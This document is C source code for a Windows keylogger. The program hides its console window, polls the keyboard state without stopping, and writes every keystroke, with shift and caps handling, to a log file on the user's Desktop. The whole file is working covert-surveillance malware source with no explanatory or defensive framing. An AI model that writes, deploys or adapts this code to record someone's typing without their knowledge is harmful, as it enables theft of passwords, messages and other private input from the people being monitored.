#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <shlobj.h>        
#include <string.h>
#include <stdbool.h>

#define _WIN32_IE 0x0600  

// Function to get the path to Desktop\log.txt
void getDesktopPath(char* path) {
    SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
    strcat(path, "\\log.txt");
}

void write_log(const char* text) {
    char desktopPath[MAX_PATH];
    getDesktopPath(desktopPath);

    FILE* file = fopen(desktopPath, "a");
    if (file != NULL) {
        fprintf(file, "%s", text);
        fclose(file);
    }
}

int main(void) {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Keys we want to monitor
    const int keys[] = {
        VK_BACK, VK_TAB, VK_RETURN, VK_SHIFT, VK_CONTROL, VK_MENU,
        VK_CAPITAL, VK_ESCAPE, VK_SPACE, VK_LEFT, VK_UP, VK_RIGHT,
        VK_DOWN, VK_DELETE,
        // 0-9
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
        // A-Z
        0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
        0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,
        0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        // Numpad
        VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4,
        VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
        VK_MULTIPLY, VK_ADD, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE,
        // Common punctuation/symbol keys
        VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD,
        VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7,
        VK_OEM_8, VK_OEM_102
    };

    const size_t key_count = sizeof(keys) / sizeof(keys[0]);

    while (1) {
        Sleep(10);  

        for (size_t i = 0; i < key_count; i++) {
            int vk = keys[i];

            // Only act on key-down transition (most significant bit)
            if (GetAsyncKeyState(vk) & 0x8000) {
                // Special keys with fixed labels
                if      (vk == VK_BACK)     write_log("[BACKSPACE]");
                else if (vk == VK_TAB)      write_log("[TAB]");
                else if (vk == VK_RETURN)   write_log("[ENTER]\n");
                else if (vk == VK_SHIFT)    write_log("[SHIFT]");
                else if (vk == VK_CONTROL)  write_log("[CTRL]");
                else if (vk == VK_MENU)     write_log("[ALT]");
                else if (vk == VK_CAPITAL)  write_log("[CAPS]");
                else if (vk == VK_ESCAPE)   write_log("[ESC]");
                else if (vk == VK_SPACE)    write_log(" ");
                else if (vk == VK_LEFT)     write_log("[LEFT]");
                else if (vk == VK_UP)       write_log("[UP]");
                else if (vk == VK_RIGHT)    write_log("[RIGHT]");
                else if (vk == VK_DOWN)     write_log("[DOWN]");
                else if (vk == VK_DELETE)   write_log("[DEL]");

                // Numpad & math operators
                else if (vk == VK_MULTIPLY) write_log("*");
                else if (vk == VK_ADD)      write_log("+");
                else if (vk == VK_SUBTRACT) write_log("-");
                else if (vk == VK_DECIMAL)  write_log(".");
                else if (vk == VK_DIVIDE)   write_log("/");

                // OEM / punctuation keys (US layout base symbols — no shift handling)
                else if (vk == VK_OEM_1)    write_log(";");
                else if (vk == VK_OEM_PLUS) write_log("=");
                else if (vk == VK_OEM_COMMA)write_log(",");
                else if (vk == VK_OEM_MINUS)write_log("-");
                else if (vk == VK_OEM_PERIOD)write_log(".");
                else if (vk == VK_OEM_2)    write_log("/");
                else if (vk == VK_OEM_3)    write_log("`");
                else if (vk == VK_OEM_4)    write_log("[");
                else if (vk == VK_OEM_5)    write_log("\\");
                else if (vk == VK_OEM_6)    write_log("]");
                else if (vk == VK_OEM_7)    write_log("'");
                else if (vk == VK_OEM_8)    write_log("");     
                else if (vk == VK_OEM_102)  write_log("<");    

                // Alphanumeric keys — proper shift + caps lock handling
                else if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A)) {
                    bool shift   = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
                    bool caps    = (GetKeyState(VK_CAPITAL)     & 0x0001) != 0;

                    char c = (char)vk;

                    // Numbers 0-9 → symbols when shift pressed
                    if (vk >= 0x30 && vk <= 0x39) {
                        if (shift) {
                            const char* symbols = ")!@#$%^&*(";
                            write_log((const char[]){symbols[vk - 0x30], 0});
                        } else {
                            write_log((const char[]){c, 0});
                        }
                    }
                    // Letters A-Z
                    else {
                        bool uppercase = shift ^ caps;  // XOR: shift XOR caps = uppercase
                        if (uppercase) {
                            write_log((const char[]){c, 0});
                        } else {
                            c += 32;  // to lowercase
                            write_log((const char[]){c, 0});
                        }
                    }
                }

                // Very crude debouncing — wait until key is released
                while (GetAsyncKeyState(vk) & 0x8000) {
                    Sleep(10);
                }
            }
        }
    }

    return 0;
}
